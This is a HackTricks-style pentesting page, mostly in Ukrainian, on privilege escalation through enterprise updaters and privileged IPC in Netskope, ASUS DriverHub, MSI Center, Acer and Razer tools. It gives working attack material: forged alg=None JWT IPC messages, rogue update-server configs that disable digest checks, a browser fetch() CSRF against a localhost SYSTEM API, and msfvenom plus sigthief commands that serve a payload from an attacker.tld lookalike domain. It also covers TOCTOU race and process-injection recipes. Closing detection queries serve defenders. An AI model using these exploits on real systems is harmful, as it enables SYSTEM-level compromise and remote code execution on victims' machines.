# Зловживання Enterprise Auto-Updaters та привілейованим IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас ланцюжків Windows local privilege escalation, знайдених в enterprise endpoint agents та updaters, які відкривають низькозатратну IPC-поверхню та привілейований потік оновлення. Репрезентативним прикладом є Netskope Client for Windows < R129 (CVE-2025-0309), де користувач з низькими привілеями може примусити enrollment на сервер, контрольований нападником, а потім доставити шкідливий MSI, який встановлює служба SYSTEM.

Ключові ідеї, які можна повторно використовувати проти схожих продуктів:
- Зловживати localhost IPC привілейованої служби, щоб примусити повторну реєстрацію або переналаштування на сервер нападника.
- Реалізувати vendor’s update endpoints, доставити підроблений Trusted Root CA та спрямувати updater на шкідливий, «підписаний» пакет.
- Уникати слабких перевірок підписувача (CN allow-lists), опційних digest-флагів та лояльних властивостей MSI.
- Якщо IPC «шифровано», виводити ключ/IV з доступних всім ідентифікаторів машини, що зберігаються в registry.
- Якщо служба обмежує викликачів за image path/process name, інжектити в allow-listed процес або створити його у suspended стані та bootstrap-нути свій DLL через мінімальне виправлення thread-context.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Багато агентів містять user-mode UI process, який спілкується зі службою SYSTEM через localhost TCP, використовуючи JSON.

Спостерігалось у Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Потік експлойту:
1) Сконструювати JWT enrollment token, чия claims контролює backend host (наприклад, AddonUrl). Використати alg=None, щоб підпис не був потрібен.
2) Надіслати IPC-повідомлення, що викликає provisioning command з вашим JWT та tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо верифікація виклику базується на шляху/імені, ініціюйте запит з бінарного файлу постачальника, внесеного до списку дозволених (див. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Після того, як client зв'яжеться з вашим server, реалізуйте очікувані endpoints і направте його на attacker MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Повернути JSON config з дуже коротким updater interval, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA сертифікат. Сервіс встановлює його в Local Machine Trusted Root store.
3) /v2/checkupdate → Надає метадані, що вказують на шкідливий MSI і підробний номер версії.

Bypassing common checks seen in the wild:
- Signer CN allow-list: сервіс може перевіряти лише, що Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати leaf certificate з цим CN і підписати MSI.
- CERT_DIGEST property: включіть безпечну MSI-властивість з іменем CERT_DIGEST. Немає примусового застосування під час інсталяції.
- Optional digest enforcement: конфігураційний прапорець (наприклад, check_msi_digest=false) вимикає додаткову криптографічну валідацію.

Result: служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.

---
## 3) Підробка зашифрованих IPC-запитів (коли присутні)

Починаючи з R127, Netskope загортав IPC JSON у поле encryptData, яке виглядає як Base64. Реверс-інжиніринг показав AES з key/IV, похідними від значень реєстру, що читаються будь-яким користувачем:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Атакувальники можуть відтворити шифрування й відправляти дійсні зашифровані команди від імені звичайного користувача. Загальна порада: якщо агент раптово «шифрує» свій IPC, шукайте device IDs, product GUIDs, install IDs під HKLM як матеріал.

---
## 4) Обхід allow-lists викликачів IPC (перевірки шляху/імені)

Деякі сервіси намагаються автентифікувати пір шляхом визначення PID TCP-з’єднання та порівняння шляху/імені образу з allow-listed бінарниками постачальника, що знаходяться в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні обхідні методи:
- DLL injection у allow-listed процес (наприклад, nsdiag.exe) і проксінг IPC зсередини нього.
- Spawn allow-listed бінару в призупиненому стані і bootstrap ваш proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити правила драйвера щодо захисту від підміни.

---
## 5) Ін’єкція, сумісна із захистом від підміни: призупинений процес + патч NtContinue

Продукти часто постачаються з minifilter/OB callbacks драйвером (наприклад, Stadrv), щоб знімати небезпечні права з дескрипторів захищених процесів:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode завантажувач, що враховує ці обмеження:
1) CreateProcess vendor binary з CREATE_SUSPENDED.
2) Отримайте дескриптори, які вам ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION на процесі, і дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви патчите код на відомому RIP).
3) Перепишіть ntdll!NtContinue (або інший ранній, гарантовано змеплений thunk) невеликою заглушкою, яка викликає LoadLibraryW із шляхом до вашої DLL, а потім повертається.
4) ResumeThread, щоб спровокувати виконання вашої заглушки в процесі і завантажити вашу DLL.

Оскільки ви ніколи не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME щодо вже-захищеного процесу (ви його створили), політика драйвера задоволена.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, підписання шкідливого MSI та надає потрібні кінцеві точки: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope — кастомний IPC клієнт, який формує довільні (опційно AES-зашифровані) IPC-повідомлення і включає ін’єкцію через призупинений процес, щоб походити з allow-listed бінару.

## 7) Швидкий триаж для невідомих updater/IPC поверхонь

Коли ви маєте справу з новим endpoint agent або набором “helper” для motherboard, швидкий робочий процес зазвичай достатній, щоб зрозуміти, чи це перспективна ціль для privesc:

1) Перелічіть loopback listeners і зіставте їх із процесами постачальника:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Перелічити потенційні named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Видобування даних маршрутизації, що зберігаються в реєстрі, і використовуються серверами IPC на базі плагінів:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Спочатку витягніть імена endpoint'ів, ключі JSON і ID команд з user-mode клієнта. Упаковані Electron/.NET frontends часто leak повну схему:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Якщо ціль аутентифікує виклики лише за PID, image path або process name, розглядайте це як тимчасову перешкоду, а не як межу: впровадження в легітимний клієнт або встановлення з'єднання з allow-listed process часто достатні, щоб пройти server’s checks. Для named pipes зокрема, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) детальніше розглядає цей примітив.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub поставляє user-mode HTTP service (ADU.exe) на 127.0.0.1:53000, який очікує виклики з браузера з https://driverhub.asus.com. Фільтр Origin просто виконує `string_contains(".asus.com")` по заголовку Origin та по download URLs, що відкриваються через `/asus/v1.0/*`. Будь-який attacker-controlled хост на кшталт `https://driverhub.asus.com.attacker.tld` тому проходить перевірку і може робити state-changing запити з JavaScript. Див. [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) для додаткових bypass patterns.

Практичний сценарій:
1) Зареєструйте домен, який містить `.asus.com`, і розмістіть там шкідливу веб-сторінку.
2) Використайте `fetch` або XHR, щоб викликати привілейований endpoint (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть the JSON body, який очікує обробник – запакований frontend JS показує схему нижче.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть PowerShell CLI, показаний нижче, успішно працює, коли заголовок Origin підроблено на довірене значення:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: коли реверсити “helper” набори, не зупиняйтеся на localhost TCP або named pipes. Перевірте COM класи з іменами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім встановіть, чи служба з підвищеними привілеями справді валідує сам цільовий бінарний файл, чи просто довіряє результату, обчисленому патчабельною user-mode клієнтською DLL. Цей патерн виходить за межі Razer: будь-який розділений дизайн, в якому брокер з високими привілеями споживає allow/deny рішення від низькопривайлевої сторони, є кандидатом для privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Старі апдейтери Notepad++, що базувалися на WinGUp, не повністю перевіряли автентичність оновлень. Коли ата тавкери компрометували хостинг-провайдера для update server, вони могли змінювати XML manifest і перенаправляти тільки обрані клієнти на attacker URLs. Оскільки клієнт приймав будь-яку HTTPS відповідь без одночасного застосування довіреного сертифікатного ланцюга та дійсного PE підпису, жертви завантажували і виконували троянізований NSIS `update.exe`.

Операційний потік (локальний exploit не потрібен):
1. **Infrastructure interception**: скомпрометувати CDN/hosting і відповідати на перевірки оновлень метаданими атакуючого, що вказують на шкідливий download URL.
2. **Trojanized NSIS**: інсталятор завантажує/виконує payload і зловживає двома execution chains:
- **Bring-your-own signed binary + sideload**: bundle підписаний Bitdefender `BluetoothService.exe` і покласти шкідливий `log.dll` у його search path. Коли підписане виконуване запускається, Windows sideloads `log.dll`, який розшифровує і reflectively завантажує бекдор Chrysalis (Warbird-protected + API hashing для ускладнення статичного виявлення).
- **Scripted shellcode injection**: NSIS виконує скомпільований Lua скрипт, що використовує Win32 APIs (наприклад, `EnumWindowStationsW`) для інжекції shellcode і постановки Cobalt Strike Beacon.

Hardening/detection takeaways для будь-якого auto-updater:
- Enforce **certificate + signature verification** завантаженого інсталятора (pin vendor signer, відхиляти невідповідні CN/chain) і підписувати сам update manifest (наприклад, XMLDSig). Блокувати manifest-controlled redirects, якщо вони не пройшли валідацію.
- Treat **BYO signed binary sideloading** як post-download detection pivot: сповіщати, коли підписаний vendor EXE завантажує DLL з іменем із поза його canonical install path (наприклад, Bitdefender завантажує `log.dll` з Temp/Downloads) і коли updater скидає/виконує інсталятори з temp з підписами, що не належать вендору.
- Monitor **malware-specific artifacts**, спостережувані в цьому ланцюжку (корисні як generic pivots): mutex `Global\Jdhfv_1.0.1`, аномальні `gup.exe` записи в `%TEMP%`, та етапи Lua-driven shellcode injection.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запуск інсталятора, що не є Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ці шаблони узагальнюються для будь-якого updater, який приймає unsigned manifests або не виконує pin installer signers—network hijack + malicious installer + BYO-signed sideloading призводить до remote code execution під виглядом “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
